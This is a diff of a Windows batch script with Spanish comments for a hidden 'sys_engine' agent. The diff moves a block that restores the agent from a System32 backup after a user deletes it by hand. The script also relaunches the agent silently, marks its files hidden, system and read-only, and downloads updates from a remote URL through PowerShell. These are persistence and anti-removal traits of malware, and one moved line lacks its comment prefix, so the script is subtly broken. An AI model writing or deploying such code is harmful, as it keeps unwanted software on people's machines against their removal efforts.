@@ -21,6 +21,15 @@ tasklist /FI "IMAGENAME eq cmd.exe" /V | findstr /I "sys_engine" >nul
 if %errorlevel% neq 0 (
     start /b "" cmd /c "%AGENTE_FILE%"
 )
+--- 4. RESTAURACIÓN Y EJECUCIÓN ---
+::Si el archivo no está (fue borrado manualmente), lo sacamos del Backup de System32
+if not exist "%AGENTE_FILE%" (
+    if not exist "%AGENTE_DIR%" mkdir "%AGENTE_DIR%" >nul 2>&1
+        
+    rem  Restauramos y blindamos inmediatamente
+    copy /y "%BACKUP_DIR%\sys_engine.bat" "%AGENTE_FILE%" >nul 2>&1
+    attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
+)
 :: --- 2. MÓDULO DE ACTUALIZACIÓN (Sincronización) ---
 :: Intentamos bajar la versión de la nube a un temporal
 powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_VERSION%', '%VLINEA%')" >nul 2>&1
@@ -61,18 +70,4 @@ if "!LINEA_LOCAL!" GEQ "!LINEA_NUBE!" (
     attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
     attrib +h +s +r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
         
-    
-
-
-
-
-    rem --- 4. RESTAURACIÓN Y EJECUCIÓN ---
-    rem Si el archivo no está (fue borrado manualmente), lo sacamos del Backup de System32
-    if not exist "%AGENTE_FILE%" (
-        if not exist "%AGENTE_DIR%" mkdir "%AGENTE_DIR%" >nul 2>&1
-        
-        rem  Restauramos y blindamos inmediatamente
-        copy /y "%BACKUP_DIR%\sys_engine.bat" "%AGENTE_FILE%" >nul 2>&1
-        attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
-    )
 )
